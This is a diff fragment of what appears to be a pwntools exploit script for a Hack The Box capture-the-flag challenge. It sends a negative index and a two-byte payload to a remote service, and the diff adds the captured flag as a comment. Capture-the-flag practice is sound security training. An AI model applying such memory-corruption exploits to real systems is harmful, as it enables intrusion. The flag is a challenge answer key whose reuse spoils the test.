@@ -9,3 +9,5 @@ io.sendline('-4');
 io.recvuntil('Spell:');
 io.sendline('\x5a\x13');
 print(io.recvall())
+
+#HTB{t4l15m4n_G0T_ur_b4ck}
